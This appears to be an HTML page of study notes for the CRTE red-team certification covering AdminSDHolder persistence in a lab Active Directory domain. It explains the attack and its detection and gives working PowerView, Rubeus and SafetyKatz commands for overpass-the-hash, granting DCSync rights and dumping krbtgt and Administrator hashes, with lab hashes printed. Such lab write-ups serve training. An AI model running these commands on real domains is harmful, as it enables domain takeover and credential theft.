@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTE Part 19 - Domain Persistence - AdminSDHolder attack | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+    }
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    .goad-content ul, .goad-content ol {
+      margin: 20px 0;
+      padding-left: 30px;
+    }
+    .goad-content li {
+      color: var(--light-gray);
+      margin-bottom: 10px;
+      font-size: 20px;
+      line-height: 1.8;
+    }
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    .goad-content blockquote {
+      border-left: 4px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray-70);
+    }
+    .goad-content hr {
+      border: none;
+      border-top: 1px solid var(--jet);
+      margin: 40px 0;
+    }
+    .part-navigation {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 50px;
+      padding-top: 30px;
+      border-top: 1px solid var(--jet);
+    }
+    .part-navigation a {
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .part-navigation a:hover {
+      text-decoration: underline;
+    }
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      padding: 5px 0;
+      transition: color 0.25s ease;
+    }
+    .goad-sidebar-list a:hover {
+      color: var(--orange-yellow-crayola);
+    }
+    .back-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--orange-yellow-crayola);
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Introduction</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Enumeration</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Privilege Escalation</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Kerberoasting attack</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Privilege Escalation - Targeted Ker...</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Privilege Escalation - LAPS (Local ...</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Dumping LSASS Credentials</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Privilege Escalation - gMSA Attack</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: LSASS Attack With MDE Bypass</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Pass The Certificates Attack</a></li>
+<li><a href="part-11-privilege-escalation-unconstrained-delegation.html">Part 11: Privilege Escalation - Unconstraine...</a></li>
+<li><a href="part-12-privilege-escalation-constrained-delegation.html">Part 12: Privilege Escalation - Constrained ...</a></li>
+<li><a href="part-13-privilege-escalation-rbcdresource-based-constraine.html">Part 13: Privilege Escalation - RBCD(Resourc...</a></li>
+<li><a href="part-14-domain-persistence-golden-ticket-attack.html">Part 14: Domain Persistence - Golden Ticket ...</a></li>
+<li><a href="part-15-domain-persistence-silver-ticket-attack.html">Part 15: Domain Persistence - Silver Ticket ...</a></li>
+<li><a href="part-16-domain-persistence-diamond-ticket-attack.html">Part 16: Domain Persistence - Diamond Ticket...</a></li>
+<li><a href="part-17-domain-persistence-skeleton-key-attack.html">Part 17: Domain Persistence - Skeleton Key A...</a></li>
+<li><a href="part-18-domain-persistence-sapphire-ticket-attack.html">Part 18: Domain Persistence - Sapphire Ticke...</a></li>
+<li><a href="part-19-domain-persistence-adminsdholder-attack.html" style="color: var(--orange-yellow-crayola);">Part 19: Domain Persistence - AdminSDHolder ...</a></li>
+<li><a href="part-20-cross-domain-attacks-active-directory-certificate.html">Part 20: Cross Domain Attacks - Active Direc...</a></li>
+<li><a href="part-21-shadow-credentials-abusing-user-object.html">Part 21: Shadow Credentials - Abusing User O...</a></li>
+<li><a href="part-22-cross-domain-attacks-unconstrained-delegation-to-e.html">Part 22: Cross Domain Attacks - Unconstraine...</a></li>
+<li><a href="part-23-cross-domain-attacks-attacking-azure-ad-integratio.html">Part 23: Cross Domain Attacks - Attacking Az...</a></li>
+<li><a href="part-24-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 24: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-25-cross-domain-attacks-child-to-forest-root-sid-hist.html">Part 25: Cross Domain attacks - Child To For...</a></li>
+<li><a href="part-26-cross-forest-attacks-kerberoast-attack.html">Part 26: Cross Forest Attacks - Kerberoast A...</a></li>
+<li><a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html">Part 27: Cross Forest Attacks - Constrained ...</a></li>
+<li><a href="part-28-cross-forest-attacks-unconstrained-delegation.html">Part 28: Cross Forest Attacks - Unconstraine...</a></li>
+<li><a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html">Part 29: Cross Forest Attacks - Trust Key Ab...</a></li>
+<li><a href="part-30-cross-forest-attacks-injecting-sid-history-to-bypa.html">Part 30: Cross Forest Attacks - Injecting SI...</a></li>
+<li><a href="part-31-trust-abuse-mssql-servers-database-links.html">Part 31: Trust Abuse - MSSQL Servers - Datab...</a></li>
+<li><a href="part-32-cross-forest-attacks-foreign-security-principals-a.html">Part 32: Cross Forest Attacks - Foreign Secu...</a></li>
+<li><a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html">Part 33: Cross Forest Attacks - Abusing PAM(...</a></li>
+<li><a href="part-34-cross-forest-attacks-trusting-to-trusted-trust-key.html">Part 34: Cross Forest Attacks - Trusting to ...</a></li>
+<li><a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Part 35: Cross Forest Attacks - Abusing Trus...</a></li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+
+<h2>Domain Persistence - AdminSDHolder attack</h2>
+
+<p>The AdminSDHolder attack is a method used to achieve domain persistence by modifying the Access Control List (ACL) of the AdminSDHolder object in Active Directory. This attack leverages the way Active Directory enforces permissions on highly privileged groups and users, allowing an attacker to establish long-term unauthorized access with minimal detection.
+To understand why this attack is so powerful, we must first recognize the role of AdminSDHolder in Active Directory. It is a special container located under CN=AdminSDHolder,CN=System,DC=domain,DC=com and serves as a template for permissions applied to protected groups and their members. These protected groups include Domain Admins, Enterprise Admins, Schema Admins, Administrators, and other high-privilege groups. Every 60 minutes (by default), a background process called Security Descriptor Propagation (SDProp) updates the permissions of these groups and their members, enforcing the ACL set on the AdminSDHolder object. This means that even if someone manually modifies permissions on a Domain Admins member, the next SDProp cycle will overwrite those changes with whatever is defined in the AdminSDHolder ACL.
+As attackers, we can exploit this behavior by modifying the ACL of AdminSDHolder itself. Instead of directly adding ourselves to the Domain Admins group, an action that defenders can easily detect, we modify the AdminSDHolder ACL to grant our user account or a backdoor account Full Control or GenericAll permissions over privileged groups. Once this change is made, the SDProp process will automatically apply our malicious ACL to all protected accounts every hour, ensuring persistent and stealthy access.
+Executing an AdminSDHolder attack requires us to first obtain sufficient privileges to modify the ACL. This typically means having Domain Admin rights or equivalent privileges that allow modifying ACLs in Active Directory. We then use PowerShell (Set-ACL), Mimikatz, or Active Directory editing tools to inject our user into the ACL of AdminSDHolder with Full Control or GenericAll permissions. Once this is in place, SDProp ensures that our privileges propagate automatically, meaning that even if defenders manually remove our permissions from a privileged group, the SDProp process will restore them within 60 minutes.
+One of the most significant aspects of this attack is stealth. Since we are not modifying individual user permissions but rather the template that governs those permissions, many traditional security monitoring tools fail to detect the initial change. By default, Active Directory does not generate security logs when the AdminSDHolder ACL is modified, making this attack difficult to spot unless explicit monitoring is in place. This is what makes the attack so effective, it ensures that even if defenders perform periodic audits of privileged groups, our access is silently reinstated every hour.
+Beyond simple privilege persistence, the AdminSDHolder attack opens the door for further abuse. Once we have inherited Full Control or GenericAll permissions over high-privilege accounts, we can:
+<ul>
+<li>Reset passwords for domain admins, gaining complete control over their accounts.</li>
+<li>Add or remove users from privileged groups, further escalating privileges or disrupting administrative control.</li>
+<li>Perform Kerberoasting attacks against protected accounts with Service Principal Names (SPNs).</li>
+<li>Leverage Resource-Based Constrained Delegation (RBCD) to escalate control over additional resources.</li>
+<li>Modify user objects to inject shadow credentials, allowing authentication without passwords.</li>
+</ul>
+However, there are limitations. While we can control privileged groups, AdminSDHolder ACL modifications do not directly grant us the ability to perform a DCSync attack. To execute DCSync, which allows dumping NTLM password hashes from the domain, we must modify the ACL of the domain object itself (DC=domain,DC=com). This action is typically logged and more likely to be detected by Microsoft Defender for Identity (MDI).
+When comparing AdminSDHolder attacks to directly modifying the ACL of protected groups, the key difference is persistence. If we simply modify the Domain Admins ACL, SDProp will reset it to match AdminSDHolder within an hour, nullifying our changes. But if we modify AdminSDHolder itself, our malicious permissions are automatically reapplied every hour. This is why AdminSDHolder abuse is far more effective for long-term access than simply editing group ACLs directly.
+Defenders can mitigate this attack by monitoring ACL changes on AdminSDHolder, which is not logged by default. Security teams must enable auditing for object modifications (Event ID 4662) and track changes to AdminSDHolder’s permissions. Additionally, organizations should limit the use of Domain Admin accounts, delegate administrative tasks to least-privilege roles, and ensure that AdminSDHolder ACLs are regularly reviewed and reset to their secure defaults.
+In summary, the AdminSDHolder attack is a powerful method for maintaining persistent and stealthy control over privileged accounts in Active Directory. By modifying the template that governs security permissions for high-privilege groups, we ensure that our unauthorized access is automatically reapplied every hour, making it extremely difficult to remove. Unlike directly adding ourselves to Domain Admins, which is obvious and easy to revert, modifying AdminSDHolder’s ACL ensures that we retain control even if defenders attempt to remove our permissions. This attack exemplifies how Active Directory’s built-in security mechanisms can be turned against it, reinforcing why understanding and monitoring ACL changes is critical in defending against advanced persistence techniques.</p>
+
+<h2>Replication Rights Enumeration with PowerView</h2>
+
+Assuming that we do have Domain Admin rights or equivalent privileges that allow modifying ACLs in Active Directory and we want for some reason add to our user the Replication Rights, allowing us for DCSync attack. Let’s start by checking if our current user (studentuser163) has Replication Right(DCSync) and we will use PowerView for that enumeration. We should bypass our PowerShell defense mechanisms first and I’ll be using InvisiShell.
+<img src="./images/screenshot_217.png" alt="">
+
+Let’s now Invoke PowerView and enumerate Replication Rights to our current studentuser163.
+Import-Module .\PowerView.ps1
+Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser163"}
+<img src="./images/screenshot_218.png" alt="">
+
+<p>Since studentuser163 does not have Replication Rights, we do not have DCSync capabilities. However, we will check if we can escalate privileges another way by looking at AdminSDHolder ACLs. If we do not have modification rights there, we will use our compromised Domain Admin to modify AdminSDHolder and persist.</p>
+
+Let’s start by elevating a session to our high privileged user, in this our case the domain Admin by doing a Pass OverPass the Hash.
+User : Administrator
+NTLM : 43b70d2d979805f419e02882997f8f3f
+ArgSplit.bat
+<img src="./images/screenshot_219.png" alt="">
+
+Let’s now run Rubeus in the memory using Loader.
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args "%Pwn%" /user:administrator /rc4:43b70d2d979805f419e02882997f8f3f /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+<img src="./images/screenshot_220.png" alt="">
+
+<p>As we can see above, we were able to spawn a new CMD process with Domain Admin privileges.</p>
+
+<h3>Granting Replication Rights with PowerView</h3>
+
+The next command will grant DCSync privileges to studentuser163 over the domain object (dc=us,dc=techcorp,dc=local). 
+Add-DomainObjectAcl -TargetIdentity "cn=AdminSDHolder,cn=System,dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser163 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
+<img src="./images/screenshot_221.png" alt="">
+
+If we double check it again, now our user studentuser163 now has Replication Rights.
+Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser163"}
+<img src="./images/screenshot_222.png" alt="">
+
+<p>Now that our studenuser163 have Replication Rights, we can now use it for DCSync attack using studentuser163.</p>
+
+Let’s encode our SatetyKatz command using ArgSplit.bat file and do the copy/paste into our current CMD session.
+ArgSplit.bat
+<img src="./images/screenshot_223.png" alt="">
+
+<p>Let’s now run SafetyKatz into the memory using our dotnet Loader and dump the KRGTGT and Administrator’s hashes.
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit”
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:us\krbtgt
+[DC] 'us.techcorp.local' will be the domain
+[DC] 'US-DC.us.techcorp.local' will be the DC server
+[DC] 'us\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)</p>
+
+<p>Object RDN           : krbtgt</p>
+
+<strong> SAM ACCOUNT </strong>
+
+<p>SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/4/2019 11:49:17 PM
+Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
+Object Relative ID   : 502</p>
+
+<p>Credentials:
+  Hash NTLM: b0975ae49f441adc6b024ad238935af5
+    ntlm- 0: b0975ae49f441adc6b024ad238935af5
+    lm  - 0: d765cfb668ed3b1f510b8c3861447173</p>
+
+<p>Supplemental Credentials:
+<em> Primary:NTLM-Strong-NTOWF </em>
+    Random Value : 819a7c8674e0302cbeec32f3f7b226c9</p>
+
+<em> Primary:Kerberos-Newer-Keys </em>
+    Default Salt : US.TECHCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+      aes128_hmac       (4096) : 1bae2a6639bb33bf720e2d50807bf2c1
+      des_cbc_md5       (4096) : 923158b519f7a454
+
+<em> Primary:Kerberos </em>
+    Default Salt : US.TECHCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 923158b519f7a454
+
+<em> Packages </em>
+    NTLM-Strong-NTOWF
+
+<em> Primary:WDigest </em>
+    01  a1bdf6146e4b13c939093eb2d72416c9
+    02  cd864c0d5369adad4fc59a469a2d4d17
+    03  2123179b0ab5c0e37943e346ef1f9d9a
+    04  a1bdf6146e4b13c939093eb2d72416c9
+    05  cd864c0d5369adad4fc59a469a2d4d17
+    06  3449e5615d5a09bbc2802cefa8e4f9d4
+    07  a1bdf6146e4b13c939093eb2d72416c9
+    08  296114c8d353f7435b5c3ac112523ba4
+    09  296114c8d353f7435b5c3ac112523ba4
+    10  5d504fb94f1bcca78bd048de9dad69e4
+    11  142c7fde1e3cb590f54e12bbfdecfbe4
+    12  296114c8d353f7435b5c3ac112523ba4
+    13  13db8df6b262a6013f78b082a72add2c
+    14  142c7fde1e3cb590f54e12bbfdecfbe4
+    15  b024bdda9bdb86af00c3b2503c3bf620
+    16  b024bdda9bdb86af00c3b2503c3bf620
+    17  91600843c8dadc79e72a753649a05d75
+    18  423730024cfbbc450961f67008a128a5
+    19  d71f700d63fa4510477342b9dc3f3cc7
+    20  bad6b9122f71f8cfd7ea556374d381d9
+    21  52c6560f77613d0dcf460476da445d93
+    22  52c6560f77613d0dcf460476da445d93
+    23  23504d9f1325c5cf68892348f26e77d7
+    24  8228bd623c788b638fce1368c6b3ef44
+    25  8228bd623c788b638fce1368c6b3ef44
+    26  a2659c1d9fa797075b1fabdee926569b
+    27  784f5fbc5276dcc8f88bbcdfa27b65d8
+    28  2ac6c7c1c24262b424f85e1ab762f1d3
+    29  4bef285b22fd87f4868be352958dcb9e
+
+mimikatz(commandline) # exit
+</code></pre>
+
+<p>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\administrator" "exit"
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:us\administrator
+[DC] 'us.techcorp.local' will be the domain
+[DC] 'US-DC.us.techcorp.local' will be the DC server
+[DC] 'us\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)</p>
+
+<p>Object RDN           : Administrator</p>
+
+<strong> SAM ACCOUNT </strong>
+
+<p>SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 7/4/2019 11:42:09 PM
+Object Security ID   : S-1-5-21-210670787-2521448726-163245708-500
+Object Relative ID   : 500</p>
+
+<p>Credentials:
+  Hash NTLM: 43b70d2d979805f419e02882997f8f3f</p>
+
+<p>Supplemental Credentials:
+<em> Primary:NTLM-Strong-NTOWF </em>
+    Random Value : 1c1f41c9f04c3dc43217246d294c2840</p>
+
+<em> Primary:Kerberos-Newer-Keys </em>
+    Default Salt : US-DCAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335
+      aes128_hmac       (4096) : c9ae4aae409161db4cbb534f58457944
+      des_cbc_md5       (4096) : 1c9be93e161643fd
+    OldCredentials
+      aes256_hmac       (4096) : d6330c70734d60d7b6966dc52e30e22603c7621a62b6bd148f3eaa603ec3d029
+      aes128_hmac       (4096) : b4772e2e2020fa438b42b427faf98087
+      des_cbc_md5       (4096) : ce94854625ad6eab
+    OlderCredentials
+      aes256_hmac       (4096) : c1001cf0def7face7454f9db13d9b758ddcb284e23025f7fbc6715e03a7f5933
+      aes128_hmac       (4096) : c9807c29c1ab7e0e9396944ed9ce19a8
+      des_cbc_md5       (4096) : 62401f4c7ce3b668
+
+<em> Packages </em>
+    NTLM-Strong-NTOWF
+
+<em> Primary:Kerberos </em>
+    Default Salt : US-DCAdministrator
+    Credentials
+      des_cbc_md5       : 1c9be93e161643fd
+    OldCredentials
+      des_cbc_md5       : ce94854625ad6eab
+
+mimikatz(commandline) # exit
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="part-navigation">
+            <a href="part-18-domain-persistence-sapphire-ticket-attack.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Domain Persistence - Sapphire </a>
+            <a href="part-20-cross-domain-attacks-active-directory-certificate.html">Next: Cross Domain Attacks - Active  <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
